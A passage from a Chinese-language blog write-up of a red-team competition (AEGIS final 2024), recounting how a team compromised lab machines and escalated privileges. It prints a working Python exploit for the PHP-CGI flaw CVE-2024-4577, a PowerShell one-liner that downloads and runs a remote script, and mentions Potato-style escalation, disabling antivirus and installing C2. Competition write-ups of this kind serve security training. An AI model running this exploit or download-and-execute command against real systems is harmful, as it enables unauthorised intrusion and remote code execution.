</code></pre><p>然後想說這有沒有可能是跟登入有關的？ 隨便拿一個當入 username 去登入，密碼就隨便填，然後他顯示 <code>登入失敗1</code>，笑死這該不會是代表 username 是正確的吧。</p><p>然後嘗試 username 跟 password 都設一樣就登入了 XD</p><p>登入後我們就有一個含有 上傳 跟 下載 功能的網頁服務，讓 TriangleSnake 去看上傳，我去看下載。</p><p>下載看不出問題後就讓 TriangleSnake 繼續看上傳，我先回去 A 機器嘗試 getshell。</p><h2 id=取得-a-機器-services-shell-與提權至-nt-system>取得 A 機器 services shell 與提權至 nt system<a hidden class=anchor aria-hidden=true href=#取得-a-機器-services-shell-與提權至-nt-system>#</a></h2><p>這時候主辦方有放出 hint</p><ul><li>web cgi php</li><li>[Hint]部分題目具有離線版本Windows Defender!!</li></ul><p>這時候已經可以確定當初想法是正確了（CVE-2024-4577），開打！</p><p>網路上找了隨便一個 <a href=https://github.com/watchtowrlabs/CVE-2024-4577>exploit</a>，挺順利就拿下這台的 shell 了，exploit:</p><pre><code class=language-python! data-lang=python!>import warnings
warnings.filterwarnings(&quot;ignore&quot;, category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print(&quot;(^_^) prepare for the Pwnage (^_^)\n&quot;)

parser = argparse.ArgumentParser(usage=&quot;&quot;&quot;python CVE-2024-4577 --target http://192.168.1.1/index.php -c &quot;&lt;?php system('calc')?&gt;&quot;&quot;&quot;)
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False

a = input()
res = s.post(f&quot;{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;, data=f&quot;&lt;?php system('{a}'); ?&gt;;echo 1337; die;&quot; )
print(res.text)
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
</code></pre><p>拿下 flag 後， <code>whoami && whoami /priv</code> 發現是 services accounts 且具有 <code>SeImpersonatePrivilege</code> 權限，因此到這邊已經有大概率成功拿到最高權限了，先不急，把一個低權限 shell 彈回來。</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=n>python3</span> <span class=n>cgi</span><span class=o>.</span><span class=n>py</span> <span class=o>--</span><span class=n>target</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.0</span><span class=o>.</span><span class=mf>0.66</span><span class=o>/</span><span class=n>dinbendon</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;x&#34;</span> <span class=o>&gt;</span> <span class=n>x</span><span class=p>;</span> <span class=n>cat</span> <span class=n>x</span> <span class=o>|</span> <span class=n>less</span>
<span class=n>powershell</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;IEX(New-Object System.Net.WebClient).DownloadString(</span><span class=se>\&#34;</span><span class=s2>http://10.0.0.253:13001/pyp.ps1</span><span class=se>\&#34;</span><span class=s2>)&#34;</span>
</code></pre></div><p>俗話說</p><blockquote><p>&ldquo;if you have Impersonation privileges you are SYSTEM!&rdquo;
@decoder_it</p></blockquote><p>既然有 <code>Impersonation</code> 那簡直就是叫我們來發動 Potatos！ 這部分感謝 DEVCORE 導師 Cyku 跟 Mico 平時的訓練，這邊提權的挺順利的ＸＤ</p><p>成功躲過防毒，並且獲得了 <code>nt system</code>，且成功獲得了第二把 flag，彈一個 shell 給隊友 pwn2ooown 做持久化（關防毒、裝 c2 與設定 RDP）</p><p>這時候已經聽說 B 機器 TriangleSnake 跟 Chumy 成功 Get Shell 了，但還沒成功提權，就先跳過去看。</p><h2 id=將-b-機器提權至-root並在上面東翻西翻>將 B 機器提權至 root，並在上面東翻西翻<a hidden class=anchor aria-hidden=true href=#將-b-機器提權至-root並在上面東翻西翻>#</a></h2><p>在 trello 上看到有在這台上面發現 rsa key，就把它下載下來，並且透過 ssh 登入上去</p><p><code>ssh jay@127.0.0.77 -i id_rsa</code></p><p>成功登入後馬上 <code>sudo -l</code> 發現有一個路徑：</p><pre><code>jay@kerkeryuan:~$ sudo -l
Matching Defaults entries for jay on kerkeryuan:
    env_reset, mail_badpass

User jay may run the following commands on kerkeryuan:
    (root) NOPASSWD: /home/jay/script/filter.sh

jay@kerkeryuan:~$ cat /home/jay/script/filter.sh
#!/bin/bash

# 定義 Web 日誌文件名
logfile=&quot;/var/log/apache2/access.log&quot;

# 定義要過濾的 IP 地址
target_ip=&quot;127.0.0.1&quot;

# 使用 grep 排除指定 IP 地址的行
grep -v &quot;$target_ip&quot; &quot;$logfile&quot; &gt; /home/jay/backup/IP_list.txt

# backup web log
gzip -c /var/log/apache2/access.log &gt; /home/jay/backup/$(date '+%Y-%m-%d')_access.gz
</code></pre><p>原本想說有沒有辦法 command injection 來提權，但隊友 pwn2ooown 問了一句：這個檔案可以改嗎，於是恍然大悟去測測看，沒想到可以修改，於是就直接去 cat <code>/root</code> 下的 flag 了，瞬間拿下第三把 flag！</p><p>之後把 jay 加入免密碼 sudo 內，並且把 Chumy 們的 ssh key 放進來，一起看這台有什麼蛛絲馬跡。</p><h2 id=看看內網有什麼東西>看看內網有什麼東西<a hidden class=anchor aria-hidden=true href=#看看內網有什麼東西>#</a></h2><p>看了一陣子遲遲不知道下一步是什麼，就開了提示，得到以下回覆：</p><ul><li>可以去看看 B 機器的網卡</li></ul><p>看了一下發現確實有另外一個網段的 IP <code>172.31.242.77/24</code>，這時候 Chumy 快速就架好了 GRE tunnel 讓隊友們都能夠直接存取這個內網網段。</p><p>之後 pwn2ooown 開始對此網段進行掃描，掃到了 <code>.10</code> 有一台 windows，看起來是 AD，不過賽後發現其他隊伍有看到其他的機器，這邊漏掉了</p><p>於是就開始打這台 Windows</p><pre><code>vincent55@debian:/Users/vincent55/CTF/AEGIS_FINAL/n88$ sudo nmap 172.31.242.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 14:45 CST
Nmap scan report for 172.31.242.10
Host is up (0.064s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
</code></pre><p>先發動 AS-REP Roasting 沒掃到東西後，時間剩下 15 分鐘，大概位於第三還是第四名，這時候 pwn2ooown 打下了關鍵一步，解了 <code>172.0.0.55</code> 上的 pwn，名次來到第二名，跟第一名同分。</p><h2 id=結語>結語<a hidden class=anchor aria-hidden=true href=#結語>#</a></h2><p>幾週前才剛在 DEVCORE RedTeam intern 學習到 Windows 滲透技巧，沒想到這麼快就用上了ＸＤ
整體比賽很有趣，目前只有在技能競賽的紅隊環節打過類似的競賽，每一次的體驗都不錯ouo</p><p>小小的遺憾是應該要等 nmap 把最後的內網網段掃完的，應該還能再多個一兩題。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://blog.vincent55.tw/posts/bcactf2024-writeups/><span class=title>Next »</span><br><span>bcactf2024 Writeups</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on twitter" href="https://twitter.com/intent/tweet/?text=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-253.927 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f&title=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97&summary=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97&source=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0v-129.439c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02v-126.056c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768h75.024zm-307.552-334.556c-25.674.0-42.448 16.879-42.448 39.002.0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f&title=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zm-119.474 108.193c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zm-160.386-29.702c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978v-192.915h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on whatsapp" href="https://api.whatsapp.com/send?text=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97%20-%20https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23-13.314-11.876-22.304-26.542-24.916-31.026s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AEGIS final 2024 紅隊心得 on telegram" href="https://telegram.me/share/url?text=AEGIS%20final%202024%20%e7%b4%85%e9%9a%8a%e5%bf%83%e5%be%97&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2faegis_final_2024%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47A3.38 3.38.0 0126.49 29.86zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z" /></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://blog.vincent55.tw/>Vincent55's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z" /></svg></a><script>let menu=document.getElementById('menu')
if(menu){menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script><script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const container=codeblock.parentNode.parentNode;const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='copy';function copyingDone(){copybutton.innerHTML='copied!';setTimeout(()=>{copybutton.innerHTML='copy';},2000);}
copybutton.addEventListener('click',(cb)=>{if('clipboard'in navigator){navigator.clipboard.writeText(codeblock.textContent);copyingDone();return;}
const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');copyingDone();}catch(e){};selection.removeRange(range);});if(container.classList.contains("highlight")){container.appendChild(copybutton);}else if(container.parentNode.firstChild==container){}else if(codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"){codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);}else{codeblock.parentNode.appendChild(copybutton);}});</script></body></html>